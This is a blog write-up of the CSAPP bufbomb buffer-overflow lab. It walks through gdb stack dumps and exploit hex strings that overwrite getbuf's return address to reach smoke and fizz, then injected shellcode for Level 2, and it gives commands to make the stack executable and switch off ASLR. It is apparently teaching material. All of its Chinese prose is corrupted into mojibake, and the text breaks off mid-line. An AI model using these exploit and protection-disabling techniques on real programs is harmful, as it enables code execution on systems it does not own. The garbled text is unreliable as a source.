15:38:09\ntop_img:\n---\n\næˆ‘å‘ç°æˆ‘åšçš„å®éªŒ 3 å’Œç½‘ä¸Šçš„éƒ½ä¸å¤ªä¸€æ ·ï¼Œéš¾é“è¿™å®éªŒæœ‰æ–°è€ç‰ˆæœ¬ä¹‹åˆ†ï¼Ÿä¸è¿‡ä¸»é¢˜éƒ½æ˜¯ä¸€è‡´çš„ï¼šåˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„æ¼æ´è¿›è¡Œæ”»å‡»ã€‚\n\n> [!notice] CSAPP LAB å®éªŒ\n>\n> - [[CSAPP LAB-1 ä½æ“ä½œ]]\n> - [[CSAPP LAB-2 äºŒè¿›åˆ¶ç‚¸å¼¹å®éªŒ]]\n> - CSAPP LAB-3 ç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹ï¼ˆæœ¬æ–‡ï¼‰\n> - [[CSAPP LAB-4 ä»£ç ä¼˜åŒ–]]\n> - [[CSAPP LAB-5 æ‰‹å†™åŠ¨æ€å­˜å‚¨åˆ†é…å™¨]]\n\nå¦‚æœä½ æ›¾ç»åšè¿‡ Lab2ï¼Œé‚£ä¹ˆé˜…è¯»æ±‡ç¼–ä»£ç å°†ä¼šå¾ˆè½»æ¾ã€‚\n\n# å®éªŒç®€ä»‹\n\nåç§°ï¼šç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹\n\nå®éªŒä»£ç ï¼š\n\n- `makecookie`ï¼šç”Ÿæˆ cookieï¼Œåç»­å®éªŒç”¨åˆ°ï¼Œä»¥åˆ¤æ–­å®éªŒæ˜¯å¦æˆåŠŸã€‚ä¾‹ï¼š`./makecookie SA18225155` ç”Ÿæˆ cookie\n- `bufbomb`ï¼šå¯æ‰§è¡Œç¨‹åº - æ”»å‡»å¯¹è±¡\n- `sendstring`: å­—ç¬¦æ ¼å¼è½¬æ¢\n\n## bufbomb ç¨‹åº\n\n`bufbomb` ä¸­åŒ…å«ä¸€ä¸ª `getbuf` å‡½æ•°ï¼Œè¯¥å‡½æ•°å®ç°å¦‚ä¸‹ï¼š\n\n```c\nint getbuf() \n{ \n \tchar buf[12]; \n\tGets(buf); \n\treturn 1; \n}\n```\n\nå¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå‡½æ•°å¯¹ buf æ²¡æœ‰è¶Šç•Œæ£€æŸ¥ï¼ˆè¿™æ˜¯å¸¸è§çš„ c ç¼–ç¨‹é”™è¯¯ï¼‰ï¼Œå½“è¾“å…¥è¶…è¿‡ 11 ä¸ªå­—ç¬¦å°†æº¢å‡ºã€‚æº¢å‡ºçš„å­—ç¬¦å°†è¦†ç›–æ ˆå¸§ä¸Šçš„æ•°æ®ï¼Œç‰¹åˆ«çš„ï¼Œä¼šè¦†ç›–ç¨‹åºè°ƒç”¨çš„è¿”å›åœ°å€ã€‚è¿™èµ‹äºˆæˆ‘ä»¬æ§åˆ¶ç¨‹åºæµç¨‹çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ æº¢å‡ºå­—ç¬¦ä¸²ï¼Œç¨‹åºå°†â€œè¿”å›â€è‡³æˆ‘ä»¬æƒ³è¦çš„ä»£ç ä¸Šã€‚\n\næ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œåæ±‡ç¼–ï¼š\n\n```sh\nobjdump -d bufbomb > bufbomb.s\n```\n\nè§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼Œç»“åˆæ ˆå¸§ç»“æ„è¿›è¡Œç†è§£ï¼š\n\n```d\n08048fe0 <getbuf>:\n 8048fe0:\t55                   \tpush   %ebp         \n 8048fe1:\t89 e5                \tmov    %esp,%ebp\n 8048fe3:\t83 ec 18             \tsub    $0x18,%esp       # ç¼“å†²åŒºåˆ†é…\n 8048fe6:\t8d 45 f4             \tlea    -0xc(%ebp),%eax  # è¯·æ³¨æ„è¿™ä¸€è¡Œ\n 8048fe9:\t89 04 24             \tmov    %eax,(%esp)\n 8048fec:\te8 6f fe ff ff       \tcall   8048e60 <Gets>\n 8048ff1:\tb8 01 00 00 00       \tmov    $0x1,%eax\n 8048ff6:\tc9                   \tleave  \n 8048ff7:\tc3                   \tret    \n 8048ff8:\t90                   \tnop\n 8048ff9:\t8d b4 26 00 00 00 00 \tlea    0x0(%esi,%eiz,1),%esi\n```\n\n![image.png|300](https://cdn.gallery.uuanqin.top/img/20240526154709.webp)\n\n## sendstring å­—ç¬¦ä¸²è½¬æ¢ç¨‹åº\n\nå®ƒçš„åŠŸèƒ½æ˜¯å°† 16 è¿›åˆ¶çš„æ•°æ®è½¬æ¢ä¸º ASCII å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š`41 42 43` è½¬æ¢ä¸º `ABC`ã€‚\n\nå› ä¸º `bufbomb` æ¥æ”¶çš„å‚æ•°æ˜¯ ASCII å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä½¿ç”¨äº†æ‰©å±•çš„ ASCII ç ï¼ˆ128~255ï¼‰éš¾ä»¥ç›´æ¥è¾“å…¥ã€‚\n\næ‰€ä»¥å®éªŒçš„åŸºæœ¬æµç¨‹ä¸ºï¼š\n\n- åœ¨ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ `exploit.txt` å†™å¥½åå…­è¿›åˆ¶æ•°æ®\n- æ‰§è¡Œå‘½ä»¤å¾—åˆ°å­—ç¬¦æ–‡ä»¶ï¼š`./sendstring < exploit.txt > exploit-raw.txt `\n- è¿è¡Œ bufbomb ç¨‹åºï¼š`bufbomb -t <your_number> < exploit-raw.txt`ã€‚`<your_number>` å¡«å†™ä½ çš„å­¦å·ä»¥éªŒè¯ cookieã€‚\n\nå½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨è¾“å…¥ï¼ˆä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¾“å…¥ï¼‰çš„æ–¹å¼ï¼š<kbd>ALT</kbd>+ASC ç çš„åè¿›åˆ¶æ•°ï¼ˆå°é”®ç›˜è¾“å…¥ï¼‰ã€‚æ³¨æ„ï¼Œæœ€åä¸€ä¸ªæ•°å­—æŒ‰ä¸‹åä¸ ALT é”®åŒæ—¶æ”¾å¼€ã€‚ä¾‹å¦‚è¾“å…¥å­—ç¬¦â€œ1â€ä¸º ALT+49\n\n> æˆ‘æ„Ÿè§‰æˆ‘ä»¬çš„å®éªŒæ—¶é˜‰å‰²ç‰ˆï¼Œä¸å¯ç”¨è¯„åˆ†ç³»ç»Ÿã€‚å’Œ Lab2 ä¸ä¸€æ ·çš„æ˜¯ï¼Œbufbomb æ˜¯è¿è¡Œ 1 æ¬¡è§£å¼€å¯¹åº” Levelã€‚å¦‚æœæœ‰ 4 ä¸ª Level æˆ‘ä»¬å¯èƒ½éœ€è¦å†™ 4 ä¸ª exploit.txtã€‚ä½†ä¸ç®¡æ€æ ·ï¼ŒåŸºæœ¬æ€è·¯æ˜¯ä¸€è‡´çš„ã€‚\n\n## GDB\n\nGDB çš„ä½¿ç”¨è¯¦è§ï¼š[[CSAPP LAB-2 äºŒè¿›åˆ¶ç‚¸å¼¹å®éªŒ]]ã€‚è¿™é‡Œæ–°å­¦ä¸€ä¸ªå‘½ä»¤ï¼š`examine` æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼ï¼ˆç®€å†™ä¸º `x`ï¼‰ã€‚`x` å‘½ä»¤çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n`x/<n/f/u> <addr>`\n\n`n`ã€`f`ã€`u` æ˜¯å¯é€‰çš„å‚æ•°ï¼š\n\n- `n` æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºæ˜¾ç¤ºå†…å­˜çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯è¯´ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºå‡ ä¸ªåœ°å€çš„å†…å®¹ã€‚\n- `f` è¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå‚è§ä¸Šé¢ã€‚å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ `s`ï¼Œå¦‚æœ åœ°å€æ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ iã€‚\n- `u` è¡¨ç¤ºä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯ï¼ŒGDB é»˜è®¤æ˜¯ 4 ä¸ª bytesã€‚`u` å‚æ•°å¯ä»¥ç”¨ä¸‹é¢çš„å­—ç¬¦æ¥ä»£æ›¿ï¼š`b` è¡¨ç¤ºå•å­—èŠ‚ï¼Œ`h` è¡¨ç¤ºåŒå­—èŠ‚ï¼Œ`w` è¡¨ç¤ºå››å­— èŠ‚ï¼Œ`g` è¡¨ç¤ºå…«å­—èŠ‚ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†å­—èŠ‚é•¿åº¦åï¼ŒGDB ä¼šä»æŒ‡å†…å­˜å®šçš„å†…å­˜åœ°å€å¼€å§‹ï¼Œè¯»å†™æŒ‡å®šå­—èŠ‚ï¼Œå¹¶æŠŠå…¶å½“ä½œä¸€ä¸ªå€¼å–å‡ºæ¥ã€‚\n\nä¾‹å­ï¼š\n\n```d\n(gdb) x/48xb $ebp\n0xffffba40:     0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n0xffffba48:     0x0b    0x38    0xe3    0xf7    0x41    0x42    0x43    0x44\n0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x00\n0xffffba58:     0x78    0xba    0xff    0xff    0x1e    0x90    0x04    0x08\n0xffffba60:     0x03    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08\n0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7\n```\n\n## ä¸€äº›æ±‡ç¼–æŒ‡ä»¤å‚è€ƒ\n\nä¸ä¸€å®šå…¨éƒ½ç”¨åˆ°ï¼š\n\n- `call åœ°å€`ï¼šè¿”å›åœ°å€å…¥æ ˆï¼ˆç­‰ä»·äº `push %eipï¼›mov åœ°å€ï¼Œ%eip`ï¼›æ³¨æ„ `eip` æŒ‡å‘ä¸‹ä¸€æ¡å°šæœªæ‰§è¡Œçš„æŒ‡ä»¤ï¼‰\n- `ret`ï¼šä»æ ˆä¸­å¼¹å‡ºåœ°å€ï¼Œå¹¶è·³åˆ°é‚£ä¸ªåœ°å€ï¼ˆpop %eipï¼‰\n- `leave`ï¼šä½¿æ ˆåšå¥½è¿”å›å‡†å¤‡ï¼Œç­‰ä»·äº `mov %ebp, %esp; pop %ebp`\n- `push`ï¼š`R[%esp]<--R[%esp]-4;  M[R[%esp]]<--S`\n- `pop`:  `D<--M[R[%esp]];   R[%esp]<--R[%esp]+4;`\n\n# å®éªŒå¼€å§‹\n\n## Level 0 - èœ¡çƒ›\n\n> æœ¬å±‚è€ƒå¯Ÿåœ°å€è·³è½¬ã€‚\n\nç‚¸å¼¹çš„ä¸»ä½“å‡½æ•° `test` ä¸ºï¼š\n\n```c\nvoid test() \n{ \n\tint val; \n\tvolatile int local = 0xdeadbeef; \n\tentry_check(3); /* Make sure entered this function properly */ \n\tval = getbuf(); // getbufå‡½æ•°åœ¨testä¸­è¢«è°ƒç”¨ï¼Œå½“getbufè¿”å›æ—¶ç»§ç»­æ‰§è¡Œåç»­å†…å®¹\n\t/* Check for corrupted stack */ \n\tif (local != 0xdeadbeef) { \n\t\tprintf(\"Sabotaged!: the stack has been corrupted\\n\"); \n\t} \n\telse if (val == cookie) { \n\t\t...\t\n}\n```\n\næ­£å¸¸è¿è¡Œçš„ç»“æœä¸ºï¼š\n\n```\nType string: <éšä¾¿è¾“å…¥å°äº11ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²>\nBetter luck next time\n```\n\n `smoke` æ˜¯ `bufbomb` ä¸­ä¸€ä¸ªæ­£å¸¸æƒ…å†µä¸‹ä¸ä¼šè¢«æ‰§è¡Œçš„å‡½æ•°ï¼š\n\n```c\nvoid smoke() \n{ \n\tentry_check(0); /* Make sure entered this function properly */ \n\tprintf(\"Smoke!: You called smoke()\\n\"); \n\tvalidate(0); \n\texit(0); \n} \n```\n\næˆ‘ä»¬çš„ç›®æ ‡ï¼šåœ¨ `getbuf` è¿”å›æ—¶è·³åˆ° `smoke` å‡½æ•°æ‰§è¡Œã€‚\n\næ€è·¯ï¼š\n\n- é€šè¿‡è°ƒè¯•å¾—åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²é¦–åœ°å€ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä½œéªŒè¯ `x/s $ebp-0xc`\n- æ‰¾åˆ°å‡½æ•° `smoke` çš„åœ°å€ `p/x &smoke`ï¼›æˆ–è€…ç›´æ¥åœ¨åç¼–è¯‘æ–‡ä»¶ä¸­æœç´¢ `smoke` å‡½æ•°åœ°å€å³å¯ã€‚\n- ç”¨ `smoke` å‡½æ•°çš„åœ°å€è¦†ç›– `getbuf` çš„è¿”å›åœ°å€ã€‚\n\næˆ‘ä»¬å…ˆç®€å•æµ‹è¯•ä¸€ä¸ªä¸ä¼šé€ æˆç¼“å†²åŒºæº¢å‡ºçš„æ­£å¸¸å­—ç¬¦ä¸²ï¼š`41 42 43 44 45 46 47 48 49 4a 4b` 11 ä¸ªå­—ç¬¦åŠ ä¸Šæœ«å°¾ `\\0`ã€‚\n\nGDB è°ƒè¯•ï¼Œåœ¨ getbuf å‡½æ•°è¿”å›å‰ï¼Œæ£€æŸ¥%espï¼š\n\n```d\n; (gdb) p /x $esp\n; $2 = 0xffffba40  â©\n\n(gdb) p /x $ebp\n$9 = 0xffffba58  â–¶ \n\n; (gdb) x/48xb $esp\n; 0xffffba40:â©  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n; 0xffffba48:     0x0b    0x38    0xe3    0xf7    ğŸ˜€0x41    0x42    0x43    0x44\n; 0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x00ğŸ˜‰\n; 0xffffba58:â–¶  0x78    0xba    0xff    0xff    â¤0x1e    0x90    0x04    0x08â¤ \n; 0xffffba60:     0x03    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08\n; 0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7\n```\n\nğŸ˜€æ ‡è®°å¤„ï¼Œä¹Ÿå°±æ˜¯æ±‡ç¼–ä»£ç ä¸­çš„ `-0xc(%ebp)` å°±æ˜¯ç¼“å†²åŒºå¼€å§‹åœ°å€ã€‚ğŸ˜‰æ ‡è®°ç¼“å†²åŒºç»“æŸçš„ä½ç½®ã€‚\n\nâ¤æ ‡è®°çš„ `0x1e    0x90    0x04    0x08` æ˜¯åœ°å€Â `0x0804901e` å°ç«¯ç¼–ç åçš„ç»“æœï¼ŒæŒ‡å‘è¿”å› test åœ°å€ï¼ˆå› ä¸º test è°ƒç”¨ getbufï¼‰ã€‚\n\né‚£æˆ‘ä»¬åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºå–è¦†ç›–æ‰è¿™ä¸ªåœ°å€å°±è¡Œï¼Œè®©ä»–æŒ‡å‘ smoke å‡½æ•°ã€‚è§‚å¯Ÿåæ±‡ç¼–çš„ä»£ç  `bufbomb.s` å®¹æ˜“çŸ¥é“ smoke å‡½æ•°åœ°å€ä¸ºï¼š`0x08048e20`ï¼Œå°ç«¯å†™æ³•ï¼š`20 8e 04 08`ã€‚æ‰€ä»¥ï¼Œ`exploit0.txt` ä¸ºï¼š\n\n```txt\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 20 8e 04 08\n```\n\ngdb é‡æ–°è¿è¡Œ bufbomb æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿæ³¨å…¥åçš„æ ˆå¸§ï¼š\n\n```d\n; æ³¨å…¥åï¼š\n; (gdb) x/48xb $esp\n; 0xffffba40:â©  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n; 0xffffba48:     0x0b    0x38    0xe3    0xf7    ğŸ˜€0x41    0x42    0x43    0x44\n; 0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c\n; 0xffffba58:â–¶  0xff    0xff    0xff    0xff    â¤0x20    0x8e    0x04    0x08â¤\n; 0xffffba60:     0x00    0x00    0x00    0x00    0xc7    0x9a    0x04    0x08\n; 0xffffba68:     0x84    0xba    0xff    0xff    0x60    0x90    0xf2    0xf7\n```\n\nè¿è¡Œç»“æœå¦‚ä¸‹ï¼š\n\n```\nType string:Smoke!: You called smoke()\n```\n\n\n## Level 1 - çƒŸç«\n\n> æœ¬å±‚è€ƒå¯Ÿå‡½æ•°ä¼ å‚ã€‚\n\nbufbomb å­˜åœ¨å¦ä¸€ä¸ªå‡½æ•° fizzï¼š\n\n```c\nvoid fizz(int val) \n{ \n\tentry_check(1); /* Make sure entered this function properly */ \nif (val == cookie) { \n\tprintf(\"Fizz!: You called fizz(0x%x)\\n\", val);  // æˆ‘ä»¬å¿…é¡»è¿è¡Œåˆ°è¿™é‡Œ\n\tvalidate(1); \n} else \n\tprintf(\"Misfire: You called fizz(0x%x)\\n\", val); \n\texit(0); \n} \n```\n\nç›®æ ‡ï¼šâ€œè¿”å›â€åˆ°è¯¥å‡½æ•°å¹¶ä¼ é€å‚æ•° cookieã€‚Cookie ä¸ºä¸Šæ–‡æåˆ°çš„ `makecookie` ç¨‹åºç»“åˆè‡ªå·±å­¦å·ç”Ÿæˆ `./makecookie SA08225155`ã€‚\n\nfizz Â çš„åœ°å€ä¸º Â `0x08048dc0`ï¼Œå°ç«¯å†™æ³•ï¼š`c0 8d 04 08`ã€‚æ‰€ä»¥å‚ç…§ Level 0ï¼Œå¾—åˆ° exploit çš„åŸºæœ¬å†™æ³•ä¸ºï¼š\n\n```\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08\n```\n\nç»§ç»­é˜…è¯»åæ±‡ç¼–ä»£ç ï¼š\n\n```d\n08048dc0 <fizz>:\n 8048dc0:\t55                   \tpush   %ebp\n 8048dc1:\t89 e5                \tmov    %esp,%ebp\n 8048dc3:\t53                   \tpush   %ebx\n 8048dc4:\t83 ec 14             \tsub    $0x14,%esp\n 8048dc7:\t8b 5d 08             \tmov    0x8(%ebp),%ebx      #  ä¸è¦çœ‹é”™ä¸º-0x8(%ebp)\n # 0x8(%ebp)  0x8049ac7 -> \n;  (gdb) p (char*) 0x8049ac7\n; $99 = 0x8049ac7 \"Type string:\"\n 8048dca:\tc7 04 24 01 00 00 00 \tmovl   $0x1,(%esp)\n 8048dd1:\te8 ca fb ff ff       \tcall   80489a0 <entry_check>\n 8048dd6:\t3b 1d cc a1 04 08    \tcmp    0x804a1cc,%ebx      #  0x804a1cc å­˜å‚¨çš„æ˜¯cookieå­—ç¬¦ä¸² 0x2ac98515 å¯¹åº”æˆ‘çš„å­¦å·\n 8048ddc:\t74 22                \tje     8048e00 <fizz+0x40>  # è¦æƒ³æˆåŠŸï¼Œå¿…é¡»ç›¸ç­‰\n 8048dde:\t89 5c 24 04          \tmov    %ebx,0x4(%esp)\n 8048de2:\tc7 04 24 98 98 04 08 \tmovl   $0x8049898,(%esp)    # ä¼ å…¥å­—ç¬¦ä¸²ï¼š\"Misfire: You called fizz(0x%x)\\n\"\n;  (gdb) p (char*) 0x8049898\n; $53 = 0x8049898 \"Misfire: You called fizz(0x%x)\\n\"  \n 8048de9:\te8 76 f9 ff ff       \tcall   8048764 <printf@plt>\n\n 8048dee:\tc7 04 24 00 00 00 00 \tmovl   $0x0,(%esp)\n 8048df5:\te8 aa f9 ff ff       \tcall   80487a4 <exit@plt>\n 8048dfa:\t8d b6 00 00 00 00    \tlea    0x0(%esi),%esi\n\n 8048e00:\t89 5c 24 04          \tmov    %ebx,0x4(%esp)\n 8048e04:\tc7 04 24 29 9a 04 08 \tmovl   $0x8049a29,(%esp) # ä¼ å…¥å­—ç¬¦ä¸²\" Fizz!: You called fizz(0x%x)\\n\"\n;  (gdb) p (char*) 0x8049a29\n; $54 = 0x8049a29 \"Fizz!: You called fizz(0x%x)\\n\" <- è¿™ä¸ªæ‰æ˜¯æˆåŠŸçš„\n 8048e0b:\te8 54 f9 ff ff       \tcall   8048764 <printf@plt>\n 8048e10:\tc7 04 24 01 00 00 00 \tmovl   $0x1,(%esp)\n 8048e17:\te8 c4 fc ff ff       \tcall   8048ae0 <validate>\n 8048e1c:\teb d0                \tjmp    8048dee <fizz+0x2e>\n 8048e1e:\t89 f6                \tmov    %esi,%esi\n```\n\næˆ‘ä»¬çŸ¥é“ï¼Œè¦æƒ³æˆåŠŸï¼Œå¿…é¡»åœ¨è·³è½¬åˆ° `fizz` å‡½æ•°åï¼Œä¼ å…¥å‚æ•°ï¼ˆå‚æ•°å€¼ä¸ºè‡ªå·±çš„ cookieï¼‰ã€‚è¿™ä¸ªå‚æ•°ä¿å­˜åœ¨ `0x8(%ebp)` ä¸­ã€‚è€æ–¹æ³•ï¼Œç›´æ¥è¦†ç›–å³å¯ï¼š\n\n```\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08 ee ee ee ee 15 85 c9 2a\n```\n\n```d\n(gdb) p /x $esp\n$1 = 0xffffba44\n\n(gdb) p /x $ebp\n$2 = 0xffffba5c\n\n(gdb) x/60xb $esp\n0xffffba44:â©  0x74    0x2b    0xdf    0xf7    0x0b    0x38    0xe3    0xf7\n0xffffba4c:     0x41    0x42    0x43    0x44    0x45    0x46    0x47    0x48\n0xffffba54:     0x49    0x4a    0x4b    0x4c    0x00    0x00    0x00    0x00\n0xffffba5c:â–¶   0xff    0xff    0xff    0xff    0xee    0xee    0xee    0xee\n0xffffba64:     â¤0x15    0x85    0xc9    0x2aâ¤    0x00    0xba    0xff    0xff\n0xffffba6c:     0x60    0x90    0xf2    0xf7    0x86    0x91    0xf2    0xf7\n0xffffba74:     0xef    0xbe    0xad    0xde    0x98    0xcc    0xff    0xff\n0xffffba7c:     0x05    0x91    0x04    0x08\n```\n\nè¿è¡Œç»“æœå¦‚ä¸‹ï¼š\n\n```\nType string:Fizz!: You called fizz(0x2ac98515)\n```\n\n## Level 2 - é­ç‚®ã€é€‰åšã€‘\n\n> æœ¬å±‚è€ƒå¯ŸæŒ‡ä»¤æ³¨å…¥ã€‚\n\nè¿™ä¸€å±‚æˆ‘ä»¬éœ€è¦è·³è½¬åˆ°å¦ä¸€ä¸ªå‡½æ•°ï¼š\n\n```c\nint global_value = 0; \nvoid bang(int val) \n{ \n\tentry_check(2); /* Make sure entered this function properly */ \n\tif (global_value == cookie) { \n\t\tprintf(\"Bang!: You set global_value to 0x%x\\n\", global_value); // å¿…é¡»æ‰§è¡Œåˆ°è¿™é‡Œ\n\t\tvalidate(2); \n\t} else \n\t\tprintf(\"Misfire: global_value = 0x%x\\n\", global_value); \n\texit(0); \n}\n```\n\nä¸ä¸Šä¸€å±‚çš„ä¸åŒç‚¹åœ¨äºè¿™ä¸ªå‡½æ•°æ£€æŸ¥çš„æ˜¯å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡å­˜å‚¨åœ¨ä¸€ä¸ªç‰¹å®šçš„åœ°å€ä¸­ã€‚\n\nè§‚å¯Ÿåæ±‡ç¼–åçš„ä»£ç ï¼š\n\n```d\n08048d60 <bang>:\n 8048d60:\t55                   \tpush   %ebp\n 8048d61:\t89 e5                \tmov    %esp,%ebp\n 8048d63:\t83 ec 08             \tsub    $0x8,%esp\n 8048d66:\tc7 04 24 02 00 00 00 \tmovl   $0x2,(%esp)\n 8048d6d:\te8 2e fc ff ff       \tcall   80489a0 <entry_check>\n 8048d72:\ta1 dc a1 04 08       \tmov    0x804a1dc,%eax   # å…¨å±€å˜é‡å­˜æ”¾åœ°å€ï¼ˆæˆ‘ä»¬éœ€è¦ä¿®æ”¹ï¼‰\n;  (gdb) p /x *0x804a1dc\n; $5 = 0x0\n 8048d77:\t3b 05 cc a1 04 08    \tcmp    0x804a1cc,%eax   # cookieå­˜æ”¾åœ°å€\n;  (gdb) p /x *0x804a1cc\n; $6 = 0x2ac98515 \n 8048d7d:\t74 21                \tje     8048da0 <bang+0x40>\n 8048d7f:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n 8048d83:\tc7 04 24 0b 9a 04 08 \tmovl   $0x8049a0b,(%esp)\n 8048d8a:\te8 d5 f9 ff ff       \tcall   8048764 <printf@plt>\n 8048d8f:\tc7 04 24 00 00 00 00 \tmovl   $0x0,(%esp)\n 8048d96:\te8 09 fa ff ff       \tcall   80487a4 <exit@plt>\n 8048d9b:\t90                   \tnop\n 8048d9c:\t8d 74 26 00          \tlea    0x0(%esi,%eiz,1),%esi\n 8048da0:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n 8048da4:\tc7 04 24 70 98 04 08 \tmovl   $0x8049870,(%esp)\n 8048dab:\te8 b4 f9 ff ff       \tcall   8048764 <printf@plt>\n 8048db0:\tc7 04 24 02 00 00 00 \tmovl   $0x2,(%esp)\n 8048db7:\te8 24 fd ff ff       \tcall   8048ae0 <validate>\n 8048dbc:\teb d1                \tjmp    8048d8f <bang+0x2f>\n 8048dbe:\t89 f6                \tmov    %esi,%esi\n```\n\nç¨‹åºå–å…¨å±€å˜é‡çš„åœ°å€ä¸º `0x804a1dc`ï¼Œè¿™ä¸ªåœ°å€åˆå§‹å€¼ä¸º 0ã€‚ç¨‹åºè®¡ç®—å¥½çš„ cookie æ”¾åœ¨ `0x804a1cc`ï¼Œä¼šå’Œå…¨å±€å˜é‡è¿›è¡Œæ¯”è¾ƒã€‚æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯å®ç°ä¿®æ”¹å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬è¿™æ—¶å€™å°±éœ€è¦æ„é€ æŒ‡ä»¤ï¼Œæ³¨å…¥ä»£ç äº†ã€‚\n\næ„é€ æŒ‡ä»¤çš„æ­¥éª¤ï¼š\n\n1. å†™ä¸€å°æ®µæ±‡ç¼–ç¨‹åº `level2.s`\n2. ç¼–è¯‘ï¼š`gcc -c level2.s `\n3. åæ±‡ç¼–å¾—åˆ°å­—èŠ‚ç ï¼š`objdump -d level2.o > level2.d`\n\nè¿™æ®µä»£ç å¦‚ä½•æ‰§è¡Œï¼Ÿå‰é¢ä¸¤ä¸ªå®éªŒå·²ç»å®ç°äº†è·³è½¬åˆ°æŸä¸ªå‡½æ•°åœ°å€æ‰§è¡Œä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å…¶è·³è½¬åˆ°ç¼“å†²åŒºä¸­ï¼Œæ‰§è¡Œæˆ‘ä»¬æ³¨å…¥çš„æŒ‡ä»¤ã€‚\n\nä½†æ˜¯åœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œæ ˆä¸­çš„å†…å®¹ä¸å¯æ‰§è¡Œï¼ˆè¯¾æœ¬å¥½åƒè®²è¿‡ç›¸å…³å†…å®¹ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å·¥å…· `execstack` æ¥è§¦æ ˆæ‰§è¡Œçš„é™åˆ¶ï¼š\n\n```sh\nsudo apt-get install execstack # å®‰è£… execstack\nexecstack -s bufbomb                  # äº²æµ‹ï¼ŒGDBåšåˆ°è¿™ä¸€æ­¥å°±è¡Œ\nsysctl -w kernel.randomize_va_space=0 # å…³é—­ASLRï¼ˆåœ°å€ç©ºé—´éšæœºåŒ–ï¼‰å‘½ä»¤\n```\n\n> å¦‚æœä¸è§£é™¤é™åˆ¶ï¼Œåç»­å®éªŒå¯èƒ½ä¼šæŠ¥æ®µé”™è¯¯ã€‚\n\nä¸‹é¢ç¼–å†™ `level2.s`ï¼š\n\n```d\nmovl $0x2ac98515,0x804a1dc\nmovl $0x08048d60,(%rsp)\nret\n\n```\n\n> æ³¨æ„æ±‡ç¼–ä»£ç æ–‡ä»¶æœ«å°¾æœ‰ç©ºè¡Œï¼Œå¦åˆ™æœ‰è­¦å‘Šï¼šwarning: end of file not at end of a line; newline inserted\n\nä¸Šé¢çš„æ±‡ç¼–ä»£ç åšäº†å‡ ä»¶äº‹æƒ…ï¼š\n\n1. æŠŠ cookie æ”¾å…¥å…¨å±€å˜é‡ï¼ˆ`0x804a1dc`ï¼‰ä¸­\n2. æŠŠ bang çš„å‡½æ•°åœ°å€å‹æ ˆ\n3. è¿”å›ã€‚ï¼ˆå¼¹æ ˆè·³è½¬åˆ°æŒ‡å®šåœ°å€ï¼‰\n\nä½¿ç”¨åæ±‡ç¼–å·¥å…·å¾—åˆ°çš„å­—èŠ‚ç å¦‚ä¸‹ï¼š\n\n```d\n\nlevel2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\tc7 04 25 dc a1 04 08 \tmovl   $0x2ac98515,0x804a1dc\n   7:\t15 85 c9 2a \n   b:\tc7 04 24 60 8d 04 08 \tmovl   $0x8048d60,(%rsp)\n  12:\tc3                   \tretq   \n\n```\n\nå› æ­¤æˆ‘ä»¬çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š`c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 